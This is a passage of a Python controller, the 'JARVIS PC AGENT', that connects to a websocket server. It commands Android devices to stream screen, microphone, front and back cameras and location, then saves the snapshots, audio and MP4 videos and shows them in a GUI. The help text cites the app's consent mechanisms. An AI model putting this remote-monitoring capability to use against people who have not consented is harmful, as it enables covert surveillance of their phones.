
                self.hide_window()

            elif command == "toggle":

                ui_enabled = (
                    not ui_enabled
                )

                if ui_enabled:

                    self.show_window()

                else:

                    self.hide_window()

            elif command == "camera_toggle":

                camera_ui_enabled = (
                    not camera_ui_enabled
                )

                self.set_camera_visible(
                    camera_ui_enabled
                )

            elif command == "screen_toggle":

                screen_ui_enabled = (
                    not screen_ui_enabled
                )

                self.set_screen_visible(
                    screen_ui_enabled
                )

            # ------------------------------------------------
            # INDICATOR
            # ------------------------------------------------

            elif (

                isinstance(
                    command,
                    tuple
                )

                and len(command) == 3

                and command[0] ==
                    "indicator"

            ):

                key = command[1]

                value = command[2]

                self.update_indicator(
                    key,
                    value
                )

            # ------------------------------------------------
            # LOCATION
            # ------------------------------------------------

            elif (

                isinstance(
                    command,
                    tuple
                )

                and len(command) == 2

                and command[0] ==
                    "location"

            ):

                location = command[1]

                self.update_location_display(
                    location
                )

            # ------------------------------------------------
            # EXIT
            # ------------------------------------------------

            elif command == "exit":

                try:

                    self.root.destroy()

                except Exception:
                    pass

                return

    # ========================================================
    # POLL FRAMES
    # ========================================================

    def poll_frames(self):

        self.process_commands()

        # ----------------------------------------------------
        # OUTPUT
        # ----------------------------------------------------

        while True:

            try:

                message = (
                    gui_output_queue
                    .get_nowait()
                )

            except queue.Empty:

                break

            self.write_output(
                message
            )

        # ----------------------------------------------------
        # CONNECTION
        # ----------------------------------------------------

        self.set_connection_status(
            connected
        )

        # ----------------------------------------------------
        # DEVICES
        # ----------------------------------------------------

        self.update_devices()

        # ----------------------------------------------------
        # INDICATORS
        # ----------------------------------------------------

        for key, value in (
            service_states.items()
        ):

            self.update_indicator(
                key,
                value
            )

        # ----------------------------------------------------
        # MEDIA
        # ----------------------------------------------------

        with ui_frame_lock:

            camera_data = ui_frames.get(
                "camera"
            )

            screen_data = ui_frames.get(
                "screen"
            )

            ui_frames[
                "camera"
            ] = None

            ui_frames[
                "screen"
            ] = None

        if camera_data is not None:

            self.display_camera(
                camera_data
            )

        if screen_data is not None:

            self.display_screen(
                screen_data
            )

        try:

            self.root.after(
                30,
                self.poll_frames
            )

        except Exception:
            pass

    # ========================================================
    # DISPLAY CAMERA
    # ========================================================

    def display_camera(
        self,
        data,
    ):

        try:

            image = Image.open(
                io.BytesIO(data)
            )

            image.load()

            width = max(

                self.camera_label.winfo_width(),

                300
            )

            height = max(

                self.camera_label.winfo_height(),

                250
            )

            image.thumbnail(

                (
                    width - 10,
                    height - 10
                ),

                Image.Resampling.LANCZOS
            )

            photo = ImageTk.PhotoImage(
                image
            )

            self.camera_label.configure(

                image=photo,

                text=""
            )

            self.camera_label.image = (
                photo
            )

        except Exception as exc:

            print(
                f"[GUI CAMERA ERROR] "
                f"{exc}"
            )

    # ========================================================
    # DISPLAY SCREEN
    # ========================================================

    def display_screen(
        self,
        data,
    ):

        try:

            image = Image.open(
                io.BytesIO(data)
            )

            image.load()

            width = max(

                self.screen_label.winfo_width(),

                300
            )

            height = max(

                self.screen_label.winfo_height(),

                250
            )

            image.thumbnail(

                (
                    width - 10,
                    height - 10
                ),

                Image.Resampling.LANCZOS
            )

            photo = ImageTk.PhotoImage(
                image
            )

            self.screen_label.configure(

                image=photo,

                text=""
            )

            self.screen_label.image = (
                photo
            )

        except Exception as exc:

            print(
                f"[GUI SCREEN ERROR] "
                f"{exc}"
            )


# ============================================================
# GUI THREAD
# ============================================================

def gui_thread_main():

    global ui_thread

    if not TK_AVAILABLE:

        print(
            "[GUI] "
            "Tkinter/Pillow unavailable."
        )

        return

    try:

        MediaViewer()

    except Exception as exc:

        print(
            f"[GUI ERROR] {exc}"
        )


# ============================================================
# START GUI
# ============================================================

def start_gui():

    global ui_thread

    if not TK_AVAILABLE:

        print(
            "[GUI] "
            "Tkinter/Pillow unavailable."
        )

        return

    ui_thread = threading.Thread(

        target=
            gui_thread_main,

        daemon=True
    )

    ui_thread.start()

    ui_ready.wait(
        timeout=5
    )

    print(
        "[GUI] Remote control "
        "interface started."
    )


# ============================================================
# DEPENDENCY STATUS
# ============================================================

def print_dependency_status():

    print()

    print(
        "MEDIA DEPENDENCIES"
    )

    print(
        "--------------------------------"
    )

    print(

        "Tkinter/Pillow : "
        +
        (
            "OK"
            if TK_AVAILABLE
            else "MISSING"
        )
    )

    print(

        "OpenCV         : "
        +
        (
            "OK"
            if CV2_AVAILABLE
            else "MISSING"
        )
    )

    print()


# ============================================================
# SAVE CAMERA SNAPSHOT
# ============================================================

async def save_camera_frame(
    payload: bytes,
):

    global last_camera_save
    global camera_video_frames

    current = now()

    if (
        current
        -
        last_camera_save
        <
        CAMERA_SAVE_INTERVAL
    ):

        return

    filename = (

        "camera_"
        +
        timestamp_string()
        +
        ".jpg"
    )

    path = (
        CAMERA_DIR /
        filename
    )

    try:

        path.write_bytes(
            payload
        )

        last_camera_save = current

        print(

            "[CAMERA] "
            "snapshot saved: "
            f"{path.name}"
        )

        async with camera_video_lock:

            camera_video_frames.append(
                path
            )

            frame_count = len(
                camera_video_frames
            )

            if (
                frame_count
                >=
                CAMERA_VIDEO_PHOTOS
            ):

                frames_for_video = (

                    camera_video_frames[
                        :CAMERA_VIDEO_PHOTOS
                    ]
                )

                camera_video_frames = (

                    camera_video_frames[
                        CAMERA_VIDEO_PHOTOS:
                    ]
                )

                asyncio.create_task(

                    create_camera_video(
                        frames_for_video
                    )
                )

    except Exception as exc:

        print(

            "[CAMERA SAVE ERROR] "
            f"{exc}"
        )


# ============================================================
# CREATE CAMERA VIDEO
# ============================================================

async def create_camera_video(
    frame_paths,
):

    if not frame_paths:
        return

    if not CV2_AVAILABLE:

        print(

            "[VIDEO] OpenCV is required "
            "to create MP4 videos."
        )

        return

    try:

        await asyncio.to_thread(

            create_camera_video_sync,

            frame_paths
        )

    except Exception as exc:

        print(
            f"[VIDEO ERROR] {exc}"
        )


# ============================================================
# CREATE VIDEO
# ============================================================

def create_camera_video_sync(
    frame_paths,
):

    if not frame_paths:
        return

    first_frame = None

    for path in frame_paths:

        if not path.exists():
            continue

        frame = cv2.imread(
            str(path)
        )

        if frame is not None:

            first_frame = frame

            break

    if first_frame is None:

        print(
            "[VIDEO] "
            "No valid camera frames found."
        )

        return

    height, width = (
        first_frame.shape[:2]
    )

    filename = (

        "camera_video_"
        +
        timestamp_string()
        +
        ".mp4"
    )

    video_path = (
        VIDEO_DIR /
        filename
    )

    fourcc = (
        cv2.VideoWriter_fourcc(
            *"mp4v"
        )
    )

    writer = cv2.VideoWriter(

        str(video_path),

        fourcc,

        CAMERA_VIDEO_FPS,

        (
            width,
            height
        )
    )

    if not writer.isOpened():

        print(
            "[VIDEO] "
            "Could not open MP4 writer."
        )

        return

    written = 0

    try:

        for path in frame_paths:

            if not path.exists():
                continue

            frame = cv2.imread(
                str(path)
            )

            if frame is None:
                continue

            frame = cv2.resize(

                frame,

                (
                    width,
                    height
                )
            )

            writer.write(
                frame
            )

            written += 1

    finally:

        writer.release()

    if written > 0:

        print()

        print(
            "[VIDEO] "
            "Camera video created:"
        )

        print(
            f"        {video_path}"
        )

        print(
            f"        Frames : {written}"
        )

        print(
            "[VIDEO] "
            f"FPS    : "
            f"{CAMERA_VIDEO_FPS:g}"
        )

        print()

    else:

        try:

            video_path.unlink(
                missing_ok=True
            )

        except Exception:
            pass


# ============================================================
# SAVE SCREEN
# ============================================================

def save_screen_frame(
    payload: bytes,
):

    filename = (

        "screen_"
        +
        timestamp_string()
        +
        ".jpg"
    )

    path = (
        SCREEN_DIR /
        filename
    )

    try:

        path.write_bytes(
            payload
        )

    except Exception as exc:

        print(

            "[SCREEN SAVE ERROR] "
            f"{exc}"
        )


# ============================================================
# PROCESS AUDIO
# ============================================================

async def process_audio_chunk(
    payload: bytes,
    source_device: str,
):

    global audio_buffer
    global audio_buffer_started
    global audio_source_device

    async with audio_lock:

        if audio_buffer_started is None:

            audio_buffer_started = now()

            audio_source_device = (
                source_device
            )

            print(

                "[AUDIO] "
                "recording started "
                f"from {source_device}"
            )

        audio_buffer.extend(
            payload
        )

        elapsed = (

            now()
            -
            audio_buffer_started
        )

        if (
            elapsed
            >=
            AUDIO_SAVE_INTERVAL
        ):

            await save_audio_buffer()


# ============================================================
# SAVE AUDIO
# ============================================================

async def save_audio_buffer():

    global audio_buffer
    global audio_buffer_started
    global audio_source_device

    if not audio_buffer:
        return

    data = bytes(
        audio_buffer
    )

    started = (

        audio_buffer_started
        or
        now()
    )

    filename = (

        "audio_"
        +

        datetime.fromtimestamp(
            started
        ).strftime(
            "%Y%m%d_%H%M%S"
        )

        +

        "_"

        +

        str(
            len(data)
        )

        +

        "bytes.bin"
    )

    path = (
        AUDIO_DIR /
        filename
    )

    try:

        path.write_bytes(
            data
        )

        duration = (

            now()
            -
            started
        )

        print(

            "[AUDIO] "
            "audio data saved: "
            f"{path.name} "
            f"({duration:.1f} sec, "
            f"{len(data)} bytes)"
        )

    except Exception as exc:

        print(

            "[AUDIO SAVE ERROR] "
            f"{exc}"
        )

    audio_buffer.clear()

    audio_buffer_started = None

    audio_source_device = "unknown"


# ============================================================
# FLUSH AUDIO
# ============================================================

async def flush_audio():

    async with audio_lock:

        if audio_buffer:

            await save_audio_buffer()


# ============================================================
# MEDIA WORKER
# ============================================================

async def media_worker():

    global media_queue

    print(
        "[MEDIA] Worker started."
    )

    while True:

        try:

            (
                media_type,
                metadata,
                payload
            ) = await media_queue.get()

            source_device = (
                metadata.get(
                    "source_device_id",
                    metadata.get(
                        "device_id",
                        "unknown",
                    ),
                )
            )

            # =================================================
            # CAMERA
            # =================================================

            if (
                media_type
                ==
                "camera_frame"
            ):

                update_ui_frame(

                    "camera_frame",

                    payload
                )

                await save_camera_frame(
                    payload
                )

            # =================================================
            # SCREEN
            # =================================================

            elif (
                media_type
                ==
                "screen_frame"
            ):

                update_ui_frame(

                    "screen_frame",

                    payload
                )

                save_screen_frame(
                    payload
                )

            # =================================================
            # MICROPHONE
            # =================================================

            elif (
                media_type
                ==
                "microphone_chunk"
            ):

                await process_audio_chunk(

                    payload,

                    source_device
                )

            media_queue.task_done()

        except asyncio.CancelledError:

            break

        except Exception as exc:

            print(

                "[MEDIA WORKER ERROR] "
                f"{exc}"
            )


# ============================================================
# HANDLE BINARY
# ============================================================

async def handle_binary(
    payload: bytes,
):

    global pending_binary_metadata

    metadata = (
        pending_binary_metadata
    )

    pending_binary_metadata = None

    if metadata is None:

        print(

            "[MEDIA] Binary received "
            "without metadata."
        )

        return

    media_type = metadata.get(
        "type",
        "unknown",
    )

    try:

        media_queue.put_nowait(

            (
                media_type,
                metadata,
                payload,
            )
        )

    except asyncio.QueueFull:

        print(

            "[MEDIA] Queue full. "
            f"Dropping {media_type} frame."
        )


# ============================================================
# MESSAGE HANDLER
# ============================================================

async def handle_message(
    message,
):

    global pending_binary_metadata
    global registered

    # ========================================================
    # BINARY
    # ========================================================

    if isinstance(
        message,
        bytes,
    ):

        await handle_binary(
            message
        )

        return

    # ========================================================
    # JSON
    # ========================================================

    try:

        data = json.loads(
            message
        )

    except json.JSONDecodeError:

        gui_log(
            "[ERROR] Invalid JSON received."
        )

        return

    message_type = data.get(
        "type"
    )

    # ========================================================
    # PC REGISTER RESPONSE
    # ========================================================

    if (
        message_type
        ==
        "pc_register_response"
    ):

        success = data.get(
            "success",
            False,
        )

        if success:

            registered = True

            gui_log(
                "[PC] Registered successfully."
            )

            await request_devices()

        else:

            gui_log(
                "[PC] Registration failed:"
            )

            gui_log(

                data.get(
                    "message",
                    "unknown",
                )
            )

        return

    # ========================================================
    # DEVICES
    # ========================================================

    if (
        message_type
        ==
        "devices"
    ):

        handle_devices(
            data
        )

        return

    # ========================================================
    # LOCATION
    # ========================================================

    if (
        message_type
        ==
        "location"
    ):

        handle_location(
            data
        )

        return

    # ========================================================
    # COMMAND RESPONSE
    # ========================================================

    if (
        message_type
        ==
        "command_response"
    ):

        handle_command_response(
            data
        )

        return

    # ========================================================
    # DEVICE INFO
    # ========================================================

    if (
        message_type
        ==
        "device_info_response"
    ):

        gui_log(
            "[DEVICE INFO]"
        )

        gui_log(

            json.dumps(
                data,
                indent=2,
            )
        )

        return

    # ========================================================
    # MEDIA METADATA
    # ========================================================

    if message_type in {

        "camera_frame",

        "screen_frame",

        "microphone_chunk",

    }:

        pending_binary_metadata = (
            data
        )

        return

    # ========================================================
    # HEARTBEAT
    # ========================================================

    if (
        message_type
        ==
        "heartbeat_response"
    ):

        return

    # ========================================================
    # PONG
    # ========================================================

    if (
        message_type
        ==
        "pong"
    ):

        return

    # ========================================================
    # ERROR
    # ========================================================

    if (
        message_type
        ==
        "error"
    ):

        gui_log(
            "[SERVER ERROR]"
        )

        gui_log(

            data.get(
                "message",
                data,
            )
        )

        return

    # ========================================================
    # UNKNOWN
    # ========================================================

    gui_log(
        "[SERVER]"
    )

    gui_log(

        json.dumps(
            data,
            indent=2,
        )
    )


# ============================================================
# RECEIVER
# ============================================================

async def receiver_loop():

    global connected

    while connected:

        try:

            message = (
                await websocket.recv()
            )

            await handle_message(
                message
            )

        except asyncio.CancelledError:

            break

        except Exception as exc:

            gui_log(

                "[RECEIVER ERROR] "
                f"{exc}"
            )

            break


# ============================================================
# CONNECT
# ============================================================

async def connect():

    global websocket
    global connected
    global registered
    global pending_binary_metadata

    try:

        gui_log(
            f"[CONNECT] {RENDER_URL}"
        )

        websocket = (
            await websockets.connect(

                RENDER_URL,

                ping_interval=20,

                ping_timeout=20,

                close_timeout=5,

                max_size=None,
            )
        )

        connected = True

        registered = False

        pending_binary_metadata = None

        gui_log(
            "[CONNECTED]"
        )

        await register_pc()

        receiver_task = (
            asyncio.create_task(
                receiver_loop()
            )
        )

        heartbeat_task = (
            asyncio.create_task(
                heartbeat_loop()
            )
        )

        done, pending = await asyncio.wait(

            {
                receiver_task,
                heartbeat_task,
            },

            return_when=
                asyncio.FIRST_COMPLETED,
        )

        for task in pending:

            task.cancel()

        for task in done:

            try:

                await task

            except Exception:

                pass

    except Exception as exc:

        gui_log(

            "[CONNECTION ERROR] "
            f"{exc}"
        )

    finally:

        connected = False

        registered = False

        websocket = None

        gui_log(
            "[DISCONNECTED]"
        )


# ============================================================
# CONNECTION MANAGER
# ============================================================

async def connection_loop():

    while True:

        await connect()

        gui_log(

            "[RECONNECT] "
            f"in {RECONNECT_DELAY} seconds..."
        )

        await asyncio.sleep(
            RECONNECT_DELAY
        )


# ============================================================
# HELP
# ============================================================

def print_help():

    print()

    print(
        "JARVIS COMMANDS"
    )

    print(
        "================================"
    )

    print(
        "devices"
    )

    print(
        "refresh"
    )

    print()

    print(
        "info <device_id>"
    )

    print(
        "battery <device_id>"
    )

    print(
        "status <device_id>"
    )

    print(
        "location <device_id>"
    )

    print()

    print(
        "screen-start <device_id>"
    )

    print(
        "screen-stop <device_id>"
    )

    print()

    print(
        "microphone-start <device_id>"
    )

    print(
        "microphone-stop <device_id>"
    )

    print()

    print(
        "camera-front-start <device_id>"
    )

    print(
        "camera-front-stop <device_id>"
    )

    print(
        "camera-back-start <device_id>"
    )

    print(
        "camera-back-stop <device_id>"
    )

    print(
        "camera-switch <device_id>"
    )

    print()

    print(
        "camera-interval "
        "<device_id> <seconds>"
    )

    print()

    print(
        "audio-interval <seconds>"
    )

    print()

    print(
        "camera-window"
    )

    print(
        "screen-window"
    )

    print(
        "media-ui"
    )

    print()

    print(
        "clear"
    )

    print(
        "help"
    )

    print(
        "exit"
    )

    print()

    print(
        "Media capture remains controlled "
        "by the Android app's existing "
        "permissions and consent mechanisms."
    )

    print()


# ============================================================
# COMMAND LINE
# ============================================================

async def cli_loop():

    global CAMERA_SAVE_INTERVAL
    global AUDIO_SAVE_INTERVAL
    global camera_ui_enabled
    global screen_ui_enabled

    print()

    print(
        "================================"
    )

    print(
        "        JARVIS PC AGENT"
    )

    print(
        "================================"
    )

    print(
        f"PC ID: {PC_DEVICE_ID}"
    )

    print(
        f"Server: {RENDER_URL}"
    )

    print()

    print_dependency_status()

    print_help()

    while True:

        try:

            command_line = (
                await asyncio.to_thread(

                    input,

                    "JARVIS> ",
                )
            )

        except EOFError:

            break

        except KeyboardInterrupt:

            print()

            break

        command_line = (
            command_line.strip()
        )

        if not command_line:
            continue

        parts = command_line.split()

        command = (
            parts[0].lower()
        )

        # ====================================================
        # EXIT
        # ====================================================

        if command == "exit":

            print(
                "Exiting..."
            )

            break

        # ====================================================
        # HELP
        # ====================================================

        if command == "help":

            print_help()

            continue

        # ====================================================
        # CLEAR
        # ====================================================

        if command == "clear":

            clear_screen()

            continue

        # ====================================================
        # DEVICES
        # ====================================================

        if command == "devices":

            print_devices()

            continue

        # ====================================================
        # REFRESH
        # ====================================================

        if command == "refresh":

            if not connected:

                print(
                    "[ERROR] Not connected."
                )

                continue

            await request_devices()

            continue

        # ====================================================
        # MEDIA UI
        # ====================================================

        if command == "media-ui":

            if not TK_AVAILABLE:

                print(
                    "[GUI] "
                    "Tkinter/Pillow unavailable."
                )

                continue

            ui_command_queue.put(
                "toggle"
            )

            print(
                "[GUI] "
                "Media viewer toggled."
            )

            continue

        # ====================================================
        # CAMERA UI
        # ====================================================

        if command == "camera-window":

            camera_ui_enabled = (
                not camera_ui_enabled
            )

            ui_command_queue.put(
                "camera_toggle"
            )

            print(

                "[CAMERA] UI = "

                +

                (
                    "ON"
                    if camera_ui_enabled
                    else "OFF"
                )
            )

            continue

        # ====================================================
        # SCREEN UI
        # ====================================================

        if command == "screen-window":

            screen_ui_enabled = (
                not screen_ui_enabled
            )

            ui_command_queue.put(
                "screen_toggle"
            )

            print(

                "[SCREEN] UI = "

                +

                (
                    "ON"
                    if screen_ui_enabled
                    else "OFF"
                )
            )

            continue

        # ====================================================
        # AUDIO INTERVAL
        # ====================================================

        if command == "audio-interval":

            if len(parts) != 2:

                print(
                    "[USAGE] "
                    "audio-interval <seconds>"
                )

                continue

            try:

                seconds = float(
                    parts[1]
                )

            except ValueError:

                print(
                    "[ERROR] "
                    "Seconds must be a number."
                )

                continue

            if seconds < 1:

                print(
                    "[ERROR] "
                    "Minimum audio interval "
                    "is 1 second."
                )

                continue

            AUDIO_SAVE_INTERVAL = (
                seconds
            )

            print(

                "[AUDIO] "
                "Save interval = "
                f"{seconds:g} seconds"
            )

            continue

        # ====================================================
        # CAMERA INTERVAL
        # ====================================================

        if command == "camera-interval":

            if len(parts) != 3:

                print(

                    "[USAGE] "
                    "camera-interval "
                    "<device_id> <seconds>"
                )

                continue

            device_id = parts[1]

            try:

                seconds = float(
                    parts[2]
                )

            except ValueError:

                print(
                    "[ERROR] "
                    "Seconds must be a number."
                )

                continue

            if seconds <= 0:

                print(
                    "[ERROR] "
                    "Seconds must be greater than 0."
                )

                continue

            CAMERA_SAVE_INTERVAL = (
                seconds
            )

            print(

                "[CAMERA] "
                "PC snapshot interval = "
                f"{seconds:g} seconds"
            )

            print(

                "[CAMERA] Target device = "
                f"{device_id}"
            )

            continue

        # ====================================================
        # NORMAL DEVICE COMMANDS
        # ====================================================

        commands_without_args = {

            "info":
                "device_info",

            "battery":
                "battery_status",

            "status":
                "connection_status",

            "location":
                "location_request",

            "screen-start":
                "start_screen",

            "screen-stop":
                "stop_screen",

            "microphone-start":
                "start_microphone",

            "microphone-stop":
                "stop_microphone",

            "camera-front-start":
                "camera_front_start",

            "camera-front-stop":
                "camera_front_stop",

            "camera-back-start":
                "camera_back_start",

            "camera-back-stop":
                "camera_back_stop",

            "camera-switch":
                "camera_switch",
        }

        if command in commands_without_args:

            if len(parts) != 2:

                print(

                    f"[USAGE] "
                    f"{command} <device_id>"
                )

                continue

            device_id = parts[1]

            server_command = (
                commands_without_args[
                    command
                ]
            )

            await send_command(

                device_id=
                    device_id,

                command=
                    server_command,
            )

            continue

        # ====================================================
        # UNKNOWN
        # ====================================================

        print(

            "[ERROR] Unknown command: "
            f"{command}"
        )

        print(
            "Type 'help' for commands."
        )


# ============================================================
# MAIN
# ============================================================

async def main():

    global media_queue
    global asyncio_loop
    global audio_lock
    global camera_video_lock
    global send_lock

    # ========================================================
    # CURRENT ASYNC LOOP
    # ========================================================

    asyncio_loop = (
        asyncio.get_running_loop()
    )

    # ========================================================
    # LOCKS
    # ========================================================

    audio_lock = asyncio.Lock()

    camera_video_lock = (
        asyncio.Lock()
    )

    send_lock = asyncio.Lock()

    # ========================================================
    # MEDIA QUEUE
    # ========================================================

    media_queue = asyncio.Queue(

        maxsize=
            MEDIA_QUEUE_MAX_SIZE
    )
    # ================================================
    # LIVE MAP
    # ================================================

    map_server = start_map_server()

    open_map()

    # ========================================================
    # GUI
    # ========================================================

    start_gui()

    # ========================================================
    # MEDIA WORKER
    # ========================================================

    media_task = asyncio.create_task(
        media_worker()
    )

    # ========================================================
    # CONNECTION
    # ========================================================

    connection_task = (
        asyncio.create_task(
            connection_loop()
        )
    )

    try:

        await cli_loop()

    finally:

        print(
            "\n[SHUTDOWN] Stopping..."
        )

        # ====================================================
        # SAVE REMAINING AUDIO
        # ====================================================

        try:

            await flush_audio()

        except Exception as exc:

            print(

                "[AUDIO FLUSH ERROR] "
                f"{exc}"
            )

        # ====================================================
        # STOP CONNECTION
        # ====================================================

        connection_task.cancel()

        try:

            await connection_task

        except asyncio.CancelledError:

            pass

        except Exception:

            pass

        # ====================================================
        # STOP MEDIA WORKER
        # ====================================================

        media_task.cancel()

        try:

            await media_task

        except asyncio.CancelledError:

            pass

        except Exception:

            pass

        # ====================================================
        # CLOSE GUI
        # ====================================================

        if TK_AVAILABLE:

            try:

                ui_command_queue.put(
                    "exit"
                )

            except Exception:

                pass

        print(
            "[SHUTDOWN] Complete."
        )


# ============================================================
# ENTRY
# ============================================================

if __name__ == "__main__":

    try:

        asyncio.run(
            main()
        )

    except KeyboardInterrupt:

        print()

        print(
            "JARVIS stopped."
        )